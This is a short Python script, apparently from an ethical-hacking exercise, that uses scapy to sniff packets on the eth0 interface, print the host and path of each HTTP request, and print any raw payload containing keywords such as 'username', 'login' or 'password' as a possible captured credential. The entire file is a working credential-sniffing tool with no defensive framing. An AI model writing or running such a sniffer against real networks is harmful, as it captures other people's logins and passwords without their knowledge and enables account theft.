import scapy.all as sc
from scapy.layers import http


def sniff(interface):
    sc.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(sc.Raw):
        load = packet[sc.Raw].load
        key_words = ["username", "user", "login", "password", "pass"]
        for word in key_words:
            if word in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")


sniff('eth0')
